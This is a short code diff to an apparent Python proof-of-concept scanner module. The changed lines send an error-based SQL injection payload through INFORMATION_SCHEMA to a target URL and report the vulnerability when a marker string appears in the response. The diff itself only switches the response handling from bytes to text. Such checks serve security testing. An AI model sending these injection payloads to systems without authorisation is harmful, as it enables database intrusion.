@@ -55,7 +55,7 @@ class Poc(ABPoc):
                        "0x7178787071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)")
             verify_url = self.target + payload
 
-            content = requests.get(verify_url).content
+            content = requests.get(verify_url).text
             if 'qkjbq1qxxpq1' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
